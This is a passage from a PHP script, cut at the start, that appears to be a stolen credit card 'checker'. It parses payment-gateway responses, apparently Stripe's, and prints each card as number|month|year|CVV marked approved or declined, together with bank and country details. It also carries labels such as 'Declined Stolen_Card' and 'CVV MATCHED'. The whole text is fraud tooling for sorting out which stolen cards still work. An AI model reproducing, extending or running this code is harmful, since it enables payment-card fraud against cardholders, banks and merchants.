            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #Declined Stolen_Card ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'cvc_check": "unavailable')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            CVC Check Unavailable ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Invalid API Key provided.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Invalid API Key ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Expired API Key provided.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Expired API Key ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Invalid account number.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Invalid Account Number ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'Invalid account.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Invalid Account Number ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}


elseif (strpos($result2, 'Your card was declined.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Card Declined ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'incorrect_number')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Invalid Card Number ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'testmode_charges_only')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Test Mode Charges Only ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

 elseif (strpos($result2, 'The transaction cannot be processed.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Transaction Cannot Be Processed ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'incorrect_cvc')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Incorrect CVC ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'expired_card')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Expired Card ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Your card does not support this type of purchase.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Card Does Not Support Purchase ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'fraudulent')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Fraudulent ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'generic_decline')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Generic Decline ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'do_not_honor')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Do Not Honor ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Your card number is incorrect.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Incorrect Card Number ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'processing_error')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Processing Error ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Your cards expiration year is invalid.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Your Card is Expired ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'Unknown error generating account.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Unknown error generating account OR EXPIRED CARD  ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CVV MATCHED -> PURCHASE REQUIRES 3DS ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧 
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
else {
  echo "
  <!-- Opaque button with glowing edges for Reprovada -->
  <span class='custom-button-glow'>
    <span class='glowing-text'>REPROVADA ❌ $cc|$mes|$ano|$cvv</span>
  </span>
  <br>
  <!-- Opaque button with glowing edges for Other Error -->
  <span class='custom-button-glow'>
    <span class='glowing-text'>Gateway API Error(Error:404) ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧</span>
  </span>
  <br>
  <!-- Opaque button with glowing edges for Bank Info -->
  <span class='custom-button-glow'>
    <span class='glowing-text'>$bank [$country] - $type</span>
  </span>
  <br>
 
  <br>

  <style>
    /* Glowing and color-changing font effect */
    @keyframes glowingTextEffect {
      0% { color: rgb(255, 0, 0); }    /* Red */
      25% { color: rgb(0, 255, 0); }   /* Green */
      50% { color: rgb(0, 0, 255); }   /* Blue */
      75% { color: rgb(255, 255, 0); } /* Yellow */
      100% { color: rgb(255, 0, 255); }/* Pink */
    }

    .glowing-text {
      text-transform: uppercase;
      font-weight: bold;
      animation: glowingTextEffect 3s infinite; /* Color-changing font effect */
      font-size: 14px; /* Smaller font size for the text */
    }

    /* Opaque button with glowing border effect */
    @keyframes glowingBorderEffect {
      0% { box-shadow: 0 0 10px rgb(255, 0, 0), 0 0 20px rgb(255, 0, 0), 0 0 30px rgb(255, 0, 0); }  /* Red */
      25% { box-shadow: 0 0 10px rgb(0, 255, 0), 0 0 20px rgb(0, 255, 0), 0 0 30px rgb(0, 255, 0); } /* Green */
      50% { box-shadow: 0 0 10px rgb(0, 0, 255), 0 0 20px rgb(0, 0, 255), 0 0 30px rgb(0, 0, 255); } /* Blue */
      75% { box-shadow: 0 0 10px rgb(255, 255, 0), 0 0 20px rgb(255, 255, 0), 0 0 30px rgb(255, 255, 0); } /* Yellow */
      100% { box-shadow: 0 0 10px rgb(255, 0, 255), 0 0 20px rgb(255, 0, 255), 0 0 30px rgb(255, 0, 255); } /* Pink */
    }

    .custom-button-glow {
      display: inline-block;
      padding: 5px 10px; /* Reduced padding for smaller buttons */
      border-radius: 5px;
      background-color: rgba(0, 0, 0, 0.8); /* Fixed opaque background */
      animation: glowingBorderEffect 3s infinite; /* Glowing, color-changing border */
      color: white; /* Default text color */
    }
  </style>
  ";
}




curl_close($ch);
ob_flush();
flush();
//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result2<br><br>";

?>

